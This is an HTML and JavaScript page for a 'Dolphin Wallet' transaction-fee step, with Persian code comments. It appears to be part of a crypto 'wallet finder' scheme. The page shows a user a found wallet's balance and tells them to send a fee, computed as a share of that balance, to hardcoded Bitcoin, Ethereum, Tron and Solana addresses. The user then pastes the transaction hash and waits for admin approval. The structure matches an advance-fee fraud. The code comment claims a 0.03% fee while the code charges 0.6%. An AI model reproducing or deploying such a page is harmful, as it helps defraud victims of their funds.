<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Transaction Fee - Dolphin Wallet</title>
  <link rel="stylesheet" href="../assets/style-neon.css" />
  <style>
    body {
      background: radial-gradient(ellipse at center, #000014, #000);
      font-family: 'Orbitron', sans-serif;
      color: #0ff;
      margin: 0;
      padding: 40px 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box {
      background: rgba(0, 10, 20, 0.85);
      padding: 30px;
      border-radius: 18px;
      box-shadow: 0 0 25px #0ff4, inset 0 0 20px #0ff3;
      text-align: center;
      max-width: 600px;
      width: 100%;
    }
    h1 { margin-bottom: 20px; }
    .wallet-address {
      font-family: monospace;
      background: #000;
      padding: 10px;
      border: 1px dashed #0ff8;
      border-radius: 8px;
      margin-bottom: 20px;
      word-break: break-all;
    }
    .copy-btn, .btn {
      margin: 10px auto;
      padding: 10px 24px;
      font-size: 0.95em;
      background: #0ff;
      color: #000;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .btn:hover, .copy-btn:hover {
      background: #00faff;
      box-shadow: 0 0 10px #0ff;
    }
    .input-field {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      font-family: monospace;
      background: #000;
      color: #0ff;
      border: 1px solid #0ff6;
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>Transaction Fee</h1>
    <p id="feeText">Loading fee...</p>
    <div class="wallet-address" id="dynamicWallet">Loading wallet address...</div>
    <button class="copy-btn" onclick="copyWallet()">Copy Wallet Address</button>
    <p>After sending, enter the transaction hash below:</p>
    <input class="input-field" id="txFinalHash" placeholder="Paste final transaction hash..." />
    <button class="btn" onclick="submitFinal()">Submit</button>
  </div>

  <script>
    const API_BASE_URL = "https://dolphinwalletfinderbackend-production.up.railway.app/api";

    // گرفتن توکن از کوکی یا هر روش دیگه که سمت کلاینت داری
    const token = getToken(); // این تابع رو باید خودت طوری بنویسی که از کوکی بخونه
    if (!token) {
      alert("Please log in first.");
      window.location.href = "login.html";
    }

    const networkAddresses = {
      "Bitcoin": "bc1qdw8agqhz08hgzlg0vqpx25rxy4qxpwsa68d5ua",
      "Ethereum": "0xacDd54d29d350f183bE47Ec64C95Bfc05805c902",
      "BNB Chain": "0xacDd54d29d350f183bE47Ec64C95Bfc05805c902",
      "Polygon": "0xacDd54d29d350f183bE47Ec64C95Bfc05805c902",
      "Tron": "TWWKr8K7pZuXTHK6ogVwZ7kAN5mVLHMmpp",
      "Solana": "D5RrUjhS2519gj77B7Ead4BB83Ew6bGmcUVX62qq5h2t"
    };

    // چک لایسنس
    fetch(`${API_BASE_URL}/license/status`, {
      headers: { "Authorization": "Bearer " + token }
    })
    .then(res => res.json())
    .then(data => {
      if (data.license !== "active") {
        alert("🚫 You must be approved by admin before continuing.");
        window.location.href = "license.html";
      } else {
        loadWalletAndFee();
      }
    })
    .catch(() => {
      alert("Server error");
      window.location.href = "license.html";
    });

    // گرفتن ولت و محاسبه فی
    function loadWalletAndFee() {
      fetch(`${API_BASE_URL}/my-wallet`, {
        headers: { "Authorization": "Bearer " + token }
      })
      .then(res => res.json())
      .then(data => {
        if (!data.wallet) {
          alert("❌ No wallet found.");
          window.location.href = "scan.html";
          return;
        }

        const wallet = data.wallet;
        const [amountStr, currency] = wallet.balance.split(" ");
        const amount = parseFloat(amountStr);
        const fee = (amount * 0.006).toFixed(8); // 0.03%

        document.getElementById("feeText").innerHTML =
          `Please send <strong>${fee} ${currency}</strong> to the wallet below:`;

        const payAddress = networkAddresses[wallet.network] || "No address for this network.";
        document.getElementById("dynamicWallet").innerText = payAddress;
      })
      .catch(() => {
        alert("Error loading wallet data.");
      });
    }

    function copyWallet() {
      const addr = document.getElementById("dynamicWallet").innerText;
      navigator.clipboard.writeText(addr);
      alert("Wallet address copied!");
    }

    // ارسال هش هزینه تراکنش به سرور
    function submitFinal() {
      const hash = document.getElementById("txFinalHash").value.trim();
      if (!hash) {
        alert("Please enter transaction hash.");
        return;
      }

      fetch(`${API_BASE_URL}/final-tx`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": "Bearer " + token
        },
        body: JSON.stringify({ tx_hash: hash })
      })
      .then(res => res.json())
      .then(data => {
        if (data.success) {
          alert("✅ Transaction hash submitted successfully! Waiting for admin approval.");
          window.location.href = "success.html";
        } else {
          alert("❌ " + (data.error || "Failed to submit transaction hash."));
        }
      })
      .catch(() => {
        alert("Server error occurred.");
      });
    }

    // نمونه تابع برای گرفتن توکن (باید بر اساس سیستم لاگین خودت بسازی)
    function getToken() {
      return localStorage.getItem("token") || sessionStorage.getItem("token");
    }
  </script>
</body>
</html>
